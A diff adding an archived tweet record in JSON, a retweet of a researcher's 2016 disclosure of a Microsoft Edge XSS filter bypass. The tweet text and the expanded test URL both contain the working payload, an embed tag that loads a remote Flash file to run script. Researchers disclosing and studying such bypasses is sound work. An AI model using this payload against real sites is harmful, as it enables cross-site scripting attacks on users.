@@ -1,0 +1,57 @@
+{
+  "tweet": {
+    "edit_info": {
+      "initial": {
+        "editTweetIds": [
+          "804320736705921024"
+        ],
+        "editableUntil": "2016-12-01T14:46:21.844Z",
+        "editsRemaining": "5",
+        "isEditEligible": true
+      }
+    },
+    "retweeted": false,
+    "source": "<a href=\"http://twitter.com/download/iphone\" rel=\"nofollow\">Twitter for iPhone</a>",
+    "entities": {
+      "hashtags": [],
+      "symbols": [],
+      "user_mentions": [
+        {
+          "name": "Masato Kinugawa",
+          "screen_name": "kinugawamasato",
+          "indices": [
+            "3",
+            "18"
+          ],
+          "id_str": "104911452",
+          "id": "104911452"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://t.co/BOFGxNft3v",
+          "expanded_url": "https://vulnerabledoma.in/char_test?body=%3Cembed/:script%20allowscriptaccess=always%20src=//l0.cm/xss.swf%3E",
+          "display_url": "vulnerabledoma.in/char_test?body…",
+          "indices": [
+            "115",
+            "138"
+          ]
+        }
+      ]
+    },
+    "display_text_range": [
+      "0",
+      "138"
+    ],
+    "favorite_count": "0",
+    "id_str": "804320736705921024",
+    "truncated": false,
+    "retweet_count": "0",
+    "id": "804320736705921024",
+    "possibly_sensitive": false,
+    "created_at": "Thu Dec 01 13:46:21 +0000 2016",
+    "favorited": false,
+    "full_text": "RT @kinugawamasato: MSEdge XSS Filter bypass:\n\n&lt;embed/:script allowscriptaccess=always src=//l0.cm/xss.swf&gt;\n\nhttps://t.co/BOFGxNft3v",
+    "lang": "en"
+  }
+}
